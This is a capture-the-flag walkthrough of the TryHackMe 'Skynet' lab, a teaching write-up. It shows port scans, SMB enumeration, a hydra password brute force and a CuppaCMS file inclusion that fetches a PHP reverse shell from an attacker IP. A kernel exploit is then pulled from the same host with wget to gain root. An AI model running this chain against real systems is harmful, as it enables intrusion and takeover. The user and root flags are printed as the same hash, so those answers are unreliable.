
# Skynet CTF Walkthrough

Skynet is a vulnerable terminator themed linux machine on TryHackMe.com<br />
<br />
<i>URL: https://tryhackme.com/room/skynet<br />
THM Difficulty: Medium<br />
My Difficulty: Easy<br />
</i>

## Enumeration

For our first command we will use rustscan, rustscan will scan all of the ports in around 3 seconds.<br />
```rustscan -a 10.10.90.192```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT1.png?raw=true)<br />
Now we know which ports are open, I run an Nmap scan with the flag -sV to find the service versions on the open ports.<br />
```nmap -sV -p22,80,110,139,143,445 10.10.90.192```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT2.png?raw=true)<br />
We have found a few services that could be interesting... Let's try to find some vulnerabilities in the services.

## Finding Vulnerabilities


### HTTP Service

I saw the target has port 80 open running Apache httpd 2.4.18. 
I open up my browser and head over to the website http://10.10.90.192/<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT3.png?raw=true)<br />
It appears to be some kind of search engine but none of the search features are working, I decide to start up gobuster
and try to find other directories on the webserver. I entered the command below to brute-force directories.<br />
```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT4.png?raw=true)<br />
After trying to access each directory, I receive a forbidden page from every directory other than /squirrelmail
Checking out this page I see a version 1.4.23, I do a little research to find out if this version is vulnerable...
Success! I can see from a simple google search that this version of squirrelmail is vulnerable to Remote Code Execution (RCE) 
However, we have a problem... After reading the exploit I realize you need to be an authenticated user... 
Let's go back to our Nmap scan results and try looking at one of the other interesting services for now.<br />

### Samba Service

We can see in our Nmap scan that they have ports 139 and 445 open for a Samba. Let's try to enumerate the shares 
and see if there's anything we can access.<br />
```smbclient -L 10.10.90.192```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT5.png?raw=true)<br />
We were able to list the shares on the server without a password for root, we can see we have access to the shares "anonymous" and "milesdyson".
Let's try to connect to them now and see if they have any files of interest!<br />
```smbclient \\\\10.10.90.192\\anonymous```<br />
Success! We were able to connect to the anonymous share without a password. Now we need to list the files avaialable on the share. <br />
```ls```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT6.png?raw=true)<br />
We can see we have a file named "attention.txt" and a directory named "logs" let's get the file attention.txt and then
change to the "logs directory" and list the files<br />
```get attention.txt```<br />
```cd logs```<br />
```ls```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT7.png?raw=true)<br />
We can see we have another 3 files inside of the "logs" directory, log1.txt, log2.txt, log3.txt. 
Let's get the files and check out our other share.<br />
```get log1.txt```<br />
```get log2.txt```<br />
```get log3.txt```<br />
```exit```<br />
```smbclient \\\\10.10.90.192\\milesdyson```<br />
We receive the error "NT_STATUS_ACCESS_DENIED" when trying to connect to the share milesdyson with an empty password for root. 
Let's try reading the files we got from the "anonymous" share. "attention.txt" "log1.txt" "log2.txt" "log3.txt"<br />
```cat attention.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT8.png?raw=true)<br />
Apparently a recent malfunction has caused passwords to be changed, we also get the name "Miles Dyson" A possible username?<br />
```cat log1.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT9.png?raw=true)<br />
log1.txt looks like it's full of passwords or usernames. Maybe we could try the possible username "Miles" or "MilesDyson" with this password list? 
I see there's nothing inside of the log2.txt and log3.txt so I remove those.<br />

Let's try bruteforcing the user "milesdyson" with the passwords we got from "log1.txt" on the squirrelmail service. 
We know there's a vulnerability in the SquirrelMail service with an available exploit. To do this we will use hydra and burp suite.<br />
```hydra -l milesdyson -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"```<br />
Success! We have successfuly logged in with the password "cyborg007haloterminator"<br />

Question 1:<br />
**What is Miles password for his emails?** cyborg007haloterminator <br />

## Exploiting Vulnerabilities

Now that we have a login for the SquirrelMail server milesdyson:cyborg007haloterminator, we know about a potential vulnerability in this version(1.4.23) and we know about an exploit for this service(CVE-2017-7692). <br /> 
Let's get to it!

### Exploiting SquirrelMail

Firstly, let's login with the aquired username:password. We are greeted with the screen below.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT10.png?raw=true)<br />
Before we exploit the vulnerability, let's have a look around and see if we can find anything interesting... The first thing that comes to my attention is the e-mails, let's have a look at each e-mail and see what's inside.<br />

There is just what looks like random mumble jumble in the first and third e-mail, let's ignore those for now. <br />
We see inside the second e-mail what looks like binary code, let's decode it and see what it means... Damn... More mumble jumble.<br />
Inside the top e-mail we see a password reset for Samba, maybe we can access the milesdyson share with this password? ")s{A&2Z=F^n_E.B`" <br />

Let's try connecting to the share... <br />
```smbclient \\\\10.10.90.192\\milesdyson -U milesdyson```<br />
Success! We managed to login to the SMB server, let's see what files are available on the share.<br />
```ls```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT11.png?raw=true)<br />
Nothing really stands out to us here except from the directory "notes" Let's change our directory and list what's inside.<br />
```cd notes```<br />
```ls```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT12.png?raw=true)<br />
There's an interesting file amongst all of the random files, let's download and take a look at "important.txt"<br />
```get important.txt```<br />
```exit```<br />
```cat important.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT13.png?raw=true)<br />
Oooh! An interesting find... It looks like a directory on the webserver. It's probably the answer to our second question!<br />
Question 2:<br />
**What is the hidden directory?** /45kra24zxs28v3yd <br />
Question 3:<br />
**What is the vulnerability called when you can include a remote file for malicious purposes?** Remote File Inclusion <br />
The answer was Remote File Inclusion but we found an exploit for Remote File Execution... Maybe more than one exploit?<br />
Let's try to exploit the vulnerability we found with the exploit CVE-2017-7692. <br />
The exploit I will be using for this can be located here: https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html <br />
Firstly I download the exploit and save it as exploit.sh in my /root directory (THM AttackBox Default Terminal Directory). We need to change the permissions of the file BEFORE executing it.<br />
```chmod +x exploit.sh```<br />
```./exploit.sh http://10.10.90.192/squirrelmail```<br />
Enter the username and password for the squirrelmail service.<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT14.png?raw=true)<br />
Something went wrong... We'll come back to this exploit later and see if we can figure out what went wrong. 
Let's try going back to the secret directory we received earlier...<br />

## Back to enumerating

Our previous exploit failed but we haven't enumerated the hidden directory we found, let's try finding more valuable information.

### Enumerating Hidden Directory

Let's have a look at the hidden directory and see if there's anything valuable! We'll use gobuster again.<br />
```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/45kra24zxs28v3yd/```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT15.png?raw=true)<br />
We discovered a directory called /administrator/ let's have a look... It appears to be a login for CuppaCMS...<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT16.png?raw=true)<br />
Maybe this is vulnerable to the Remote File Inclusion question we answered earlier? Let's do some research....<br />
Bingo! I found an exploit in the software for RFI! What's even better is that you don't have to be an authenticated user<br />
For more information about the exploit: https://www.exploit-db.com/exploits/25971<br />

## Back to exploiting

### Exploiting CuppaCMS

After reading the exploit page I know which page has the vulnerability and I try to exploit it.<br />
```http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT17.png?raw=true)<br />
My request was successful! Now let's create a reverse shell and try to escalate our privileges! <br />
Firstly, we'll host our reverse php shell on a python http server to serve to the website<br />
```python3 -m http.server 8000```<br />
Secondly, we'll open up a listener on our attacking machine.<br />
```nc -lvnp 8888```<br />
Third, we'll get the target to execute our remote shell<br />
```http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.113.195:8000/shell.php```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT18.png?raw=true)<br />
Success! We now have a shell, we can see from the output that we are user ID 33 www-data<br />
Before trying to escalate our privileges let's have a look around on the current user to see if we can find the user flag. 
On most CTF's I've found they are usually inside of the home folders. Let's go have a look.<br />
```cd /home/```<br />
```ls```<br />
```cat user.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT19.png?raw=true)<br />
Success! We found the user flag. Let's get to work and see if we can escalate our privileges.
Question 4:<br />
**What is the user flag?** 7ce5c2109a40f958099283600a9ae807

## Privilege Escalation

Since the shell we got isn't very stable, let's use Python to help that.<br />
```python -c 'import pty;pty.spawn("/bin/bash")'<br />```
Alright! Let's see what we can do about escalating our privileges, I'll start first by checking what kernel they are using.<br />
```uname -a```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT20.png?raw=true)<br />
We can see the kernel version is 4.8.0-58-generic, let's have a look for exploits in that kernel version. 
Good news! We can see on exploit-db with a little research that it is vulnerable - https://www.exploit-db.com/exploits/43418<br />
Let's download the exploit on the target machine, we'll have to download it on our attacker machine first then serve it through 
the python HTTP server we set up earlier.<br />
Once you have downloaded the exploit and saved it in the same directory as your web server is running... Change your target machines directory to a place you have write permissions I used /tmp<br />
```wget http://10.10.113.195:8000/priv.c```<br />
```chmod +x priv.c```<br />
```gcc priv.c -o priv```<br />
```./priv```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT21.png?raw=true)<br />
SUCCESS! We have root, all we have to do now is find the root flag and we're done!<br />
```cd /root```<br />
```cat root.txt```<br />
![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Skynet/screenshots/SCREENSHOT22.png?raw=true)<br />
Question 5:<br />
**What is the root flag?** 7ce5c2109a40f958099283600a9ae807<br />

### Farewell, I hope you all enjoyed this write-up!

